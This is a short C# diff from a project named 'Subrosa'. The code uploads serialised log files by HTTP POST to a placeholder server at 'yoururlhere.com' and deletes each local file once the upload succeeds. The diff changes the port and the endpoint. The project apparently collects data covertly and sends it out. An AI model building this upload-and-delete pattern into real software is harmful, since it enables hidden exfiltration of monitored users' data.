@@ -48,7 +48,7 @@ namespace Subrosa
                     if (await UploadFile(model))
                         files[i].Delete();
                 }
-                catch{}
+                catch(Exception e){}
             }
         }
 
@@ -57,7 +57,7 @@ namespace Subrosa
             string json = JsonConvert.SerializeObject(log);
             HttpClient client = new HttpClient();
             StringContent content = new StringContent(json, Encoding.UTF8, "application/json");
-            HttpResponseMessage response = await client.PostAsync("http://www.yoururlhere.com:6969/PostLog", content);
+            HttpResponseMessage response = await client.PostAsync("http://www.yoururlhere.com:8889/Upload", content);
 
             if (response.StatusCode == HttpStatusCode.OK)
                 return true;
